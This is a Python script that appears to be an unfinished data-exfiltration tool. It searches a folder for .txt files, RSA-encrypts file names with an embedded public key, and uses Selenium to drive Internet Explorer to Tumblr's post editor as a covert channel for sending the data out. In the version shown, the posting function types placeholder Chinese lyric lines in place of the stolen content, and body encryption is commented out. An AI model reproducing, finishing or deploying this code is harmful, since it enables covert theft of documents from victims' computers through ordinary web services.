# -*- coding: utf-8 -*-
"""
Created on Fri Apr 12 22:10:03 2019

@author: QIAN
"""
from selenium import webdriver
import os
import fnmatch
import time
import random
import zlib
import sys, codecs

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".txt"
username = "username"
password = "password"

public_key = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs7RXkZdpnzK1ybre0ooS\n5rRByRnU6GHPoIhnHcT5lBrsFiFuu9kilu/zTcVKomFzoKsraOTLqD00RKlwr7O4\n1CjUKJCt5CKGHOmdKOUEEzCis9ZkX0QUYnlwmHPx65GN0FC0OWuei7QpxRLNBOTb\nsLU6nve5X0AauPV6qY8mywZm7JrZd5zjGE4jXBvy0cUxhhbhfGgju4JZ7xuYLTAt\ntnJzouk4LiVWxwodnVcV/IufRnESQHdcNXa75oc7QIfb6GXqZhiQhehZOGsv06RA\nmhXgjGyVDKz7tOcI0ssOoXBSp+BSqNQaHipLf3LtqWsSeORYkGRrvR0q4RodTNU2\nfwIDAQAB\n-----END PUBLIC KEY-----'


def encrypt_string(plaintext1):
    
    chunk_size = 128
    print ("Compressing: {} bytes".format(len(plaintext1)))
    print(type(plaintext1))
    # plaintext = plaintext1.encode()
    # plaintext = plaintext1
    plaintext = zlib.compress(plaintext1)

    print ("Encrypting {} bytes".format(len(plaintext)))
  
    # rsakey = RSA.importKey(decode_base64(public_key))
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = b""
    offset = 0
    while offset < len(plaintext):
        chunk = plaintext[offset:offset+chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    # encrypted = encrypted.encode("base64")

    print ("Base64 encoded crypto: {}".format(len(encrypted)))

    return encrypted


def encrypt_post(filename):
    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename.encode())
    # encrypted_body = encrypt_string(contents)
    encrypted_body = contents
    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(1, 2))
    return




def post_to_tumblr(ie, title, post):
    elementi = ie.find_element_by_class_name('editor')
    print("ready to send")
    # title1 = zlib.decompress(title)
    # print(type(title1))
    elementi.send_keys("离开我你真的过得好吗")
    # time.sleep(10)
    elementi = ie.find_element_by_class_name('editor')
    elementi.send_keys("没有我也许是种解脱")
    elementi = ie.find_element_by_class_name('button-area')
    webdriver.common.action_chains.ActionChains(ie).click(elementi).perform()

def exfiltrate(document_path):
    ie = webdriver.Ie()
    
    ie.get(r"https://www.tumblr.com/new/text/")
    
    # time.sleep(5)

    # encrypt the file
    title, body = encrypt_post(document_path)

    print ("Creating new post...")
    post_to_tumblr(ie, title, body)
    print ("Posted!")

    # destroy the IE instance
    input("press any key to quit")
    ie.close()
    ie = None


# main loop for document discovery
for parent, directories, filenames in os.walk("C:\\test\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        print(filename)
        document_path = os.path.join(parent, filename)
        print ("Found: {}".format(document_path))
        exfiltrate(document_path)